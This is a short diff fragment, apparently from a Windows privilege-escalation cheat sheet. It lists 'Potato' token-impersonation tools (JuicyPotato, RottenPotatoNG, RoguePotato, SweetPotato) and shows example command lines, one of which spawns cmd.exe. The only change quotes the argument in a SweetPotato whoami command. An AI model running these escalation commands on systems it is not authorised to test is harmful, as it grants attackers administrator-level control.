@@ -39,4 +39,4 @@ JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {4991d34b-80a1-42
 https://github.com/breenmachine/RottenPotatoNG
 https://github.com/antonioCoco/RoguePotato2
 https://github.com/CCob/SweetPotato
-SweetPotato -a whoami
+SweetPotato -a "whoami"
